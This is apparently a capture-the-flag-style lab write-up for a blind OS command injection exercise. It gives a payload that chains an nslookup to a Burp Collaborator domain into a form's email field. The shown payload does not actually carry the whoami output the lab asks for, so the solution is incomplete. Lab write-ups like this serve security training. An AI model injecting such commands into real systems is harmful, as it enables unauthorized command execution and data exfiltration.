# Lab 4 - Blind OS command injection with out-of-band data exfiltration

```
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
```
### Solution - 

We first create a external server ie . collaborator server.

Copy the collaborator server link - `http://zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net/`

Paste the payload `||nslookup+x.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net|| ` (URL - encode ) in the email parameter .
